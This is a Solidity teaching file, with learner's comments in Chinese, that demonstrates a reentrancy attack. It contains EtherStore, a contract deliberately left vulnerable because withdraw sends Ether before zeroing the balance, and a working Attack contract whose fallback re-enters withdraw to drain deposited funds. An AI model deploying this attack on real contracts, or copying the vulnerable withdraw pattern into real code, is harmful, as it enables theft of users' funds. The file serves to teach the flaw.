// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    // 账户=>余额
    mapping(address => uint) public balances;

    // 存入
    function deposit() public payable {
        balances[msg.sender] += msg.value; // 在存入人的账户余额上增加存入款的额度
    }
    
    
    // 取出
    function withdraw() public {
        uint bal = balances[msg.sender]; // 查看取款人账上有多少钱
        require(bal > 0); // 账上没钱则停止执行

        (bool sent, ) = msg.sender.call{value: bal}(""); // withdraw()默认是把钱全部取出
        require(sent, "Failed to send Ether"); // 要求取钱动作成功执行

        balances[msg.sender] = 0; //把取款人账户余额置为零
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore; // 这个动作是不是相当于deploy了一个ethersore的实例？

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress); // 把合约部署在一个指定的地址上，还可以这样？
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
